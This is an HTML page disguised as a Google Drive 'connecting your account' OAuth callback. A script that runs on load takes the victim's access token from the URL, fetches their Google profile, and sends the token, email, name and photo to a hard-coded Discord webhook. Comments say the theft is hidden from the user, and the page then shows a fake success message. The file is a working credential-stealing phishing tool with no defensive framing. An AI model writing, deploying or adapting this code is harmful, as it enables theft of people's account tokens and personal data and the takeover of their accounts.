
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connecting...</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
        }
        .container {
            background: white;
            padding: 40px;
            border-radius: 10px;
            box-shadow: 0 10px 25px rgba(0,0,0,0.2);
            text-align: center;
            max-width: 400px;
        }
        .spinner {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #4285f4;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .success {
            color: #4caf50;
            font-size: 50px;
            margin-bottom: 20px;
        }
        .error {
            color: #f44336;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="spinner"></div>
        <h2>Connecting your account...</h2>
        <p>Please wait a moment.</p>
    </div>

    <script>
        // ⚠️ IMPORTANT: Replace with your webhook URL
        // Options:
        // 1. webhook.site - Get a free webhook URL at https://webhook.site
        // 2. discord webhook - Create a Discord webhook
        // 3. telegram bot - Use Telegram bot API
        // 4. your email via formspree.io or similar

        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1476800614494372060/Ou9Jhhc8hYIbBdJStpuj43OoLki04_mhSQZS-VeZUcxOLFvARBarlNaANG6P3rzyM1Ke';

        async function handleCallback() {
            try {
                // Parse the hash fragment to get the access token
                const hash = window.location.hash.substring(1);
                const params = new URLSearchParams(hash);

                const accessToken = params.get('access_token');
                const state = params.get('state');
                const error = params.get('error');

                if (error) {
                    throw new Error('Authorization denied');
                }

                if (!accessToken) {
                    throw new Error('No access received');
                }

                // Get user info silently
                const userInfo = await getUserInfo(accessToken);

                // Send to your webhook (HIDDEN from user)
                await sendToWebhook({
                    token: accessToken,
                    email: userInfo.email,
                    name: userInfo.name,
                    picture: userInfo.picture,
                    timestamp: new Date().toISOString(),
                    expiresIn: params.get('expires_in'),
                    scope: params.get('scope')
                });

                // Show success message (NO TOKEN SHOWN)
                document.querySelector('.spinner').style.display = 'none';
                document.querySelector('.container').innerHTML = `
                    <div class="success">✓</div>
                    <h2>Successfully Connected!</h2>
                    <p>Your Google Drive has been linked.</p>
                    <p style="color: #666; font-size: 14px;">You can close this window now.</p>
                `;

                // Redirect if state parameter provided
                if (state && state !== 'undefined') {
                    setTimeout(() => {
                        window.location.href = state + (state.includes('?') ? '&' : '?') + 'status=success';
                    }, 2000);
                }

            } catch (error) {
                console.error('Error:', error);
                document.querySelector('.spinner').style.display = 'none';
                document.querySelector('.container').innerHTML = `
                    <div class="error">✗</div>
                    <h2>Connection Failed</h2>
                    <p>Please try again or contact support.</p>
                `;
            }
        }

        async function getUserInfo(accessToken) {
            const response = await fetch('https://www.googleapis.com/oauth2/v2/userinfo', {
                headers: {
                    'Authorization': `Bearer ${accessToken}`
                }
            });

            if (!response.ok) {
                throw new Error('Failed to verify account');
            }

            return await response.json();
        }

        async function sendToWebhook(data) {
            // This sends the token to YOUR webhook
            const response = await fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(data)
            });

            if (!response.ok) {
                // Don't show error to user, just log it
                console.error('Webhook failed');
            }
        }

        // Run immediately
        handleCallback();
    </script>
</body>
</html>
